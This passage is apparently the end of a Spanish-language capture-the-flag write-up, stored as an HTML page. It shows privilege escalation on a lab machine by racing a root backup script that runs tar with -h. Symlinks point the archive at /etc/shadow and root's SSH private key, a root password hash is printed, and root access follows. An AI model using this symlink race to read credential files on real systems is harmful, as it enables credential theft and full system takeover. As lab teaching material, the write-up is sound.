+2026/01/09 15:49:01 CMD: UID=0 PID=664975 | /bin/bash /usr/bin/backup.sh
+2026/01/09 15:49:01 CMD: UID=0 PID=664974 | sha1sum /opt/backups/175513947.tar</code></pre>
+                <p>El script <code>/usr/bin/backup.sh</code> parece prometedor para la escalada de privilegios.</p>
+
+                <h2>Análisis del Script de Backup</h2>
+                <p>Examinando el script de backup:</p>
+                <pre><code class="language-bash">tom@epsilon:~$ cat /usr/bin/backup.sh
+#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*</code></pre>
+                <p>El script tiene una vulnerabilidad crítica. Incluye un <code>sleep 5</code> y usa la bandera <code>-h</code> con tar:</p>
+                <pre><code class="language-bash">-h, --dereference
+    Follow symlinks; archive and dump the files they point to.</code></pre>
+                <p>Esto significa que si creo un symlink desde <code>/opt/backups/checksum</code> a un archivo sensible durante la ventana de 5 segundos, tar desreferenciará el symlink e incluirá los contenidos del archivo objetivo en el archivo almacenado en <code>/var/backups/web_backups/</code>, que luego podré extraer y leer.</p>
+
+                <h2>Escalada de Privilegios mediante Condición de Carrera</h2>
+                <p>Creo un script para explotar la condición de carrera:</p>
+                <pre><code class="language-bash">tom@epsilon:~$ cat xd.sh
+rm -rf /opt/backups/*
+ln -s /etc/shadow /opt/backups/checksum</code></pre>
+                <p>Monitorizo <code>/opt/backups/</code> con <code>ls</code> y ejecuto mi script tan pronto como el primer comando tar se completa y el sleep comienza. Después de que el ciclo completo de backup se completa, recupero el archivo tar de <code>/var/backups/web_backups/</code>, lo extraigo, y leo el archivo <code>checksum</code>, que ahora contiene <code>/etc/shadow</code>:</p>
+                <pre><code class="language-bash">tom@epsilon:~/opt/backups$ cat checksum
+root:$6$/Vf10dLMR29zhGc2$fw0YBQVDJOJD2Kwk3AWwktE2G3B4oM500WIxKcnWEHIjftuBWnW6uAJic5exbVzRo0hv95jGHY3umOoSmykDd0:18981:0:99999:7:::</code></pre>
+                <p>En lugar de crackear el hash de la contraseña, repito el proceso pero esta vez creo un symlink a <code>/root/.ssh/id_rsa</code>. El archivo existe y el exploit funciona perfectamente. Recupero la clave privada SSH de root del archivo de backup y la uso para conectarme por SSH a la máquina como root, consiguiendo compromiso completo del sistema.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
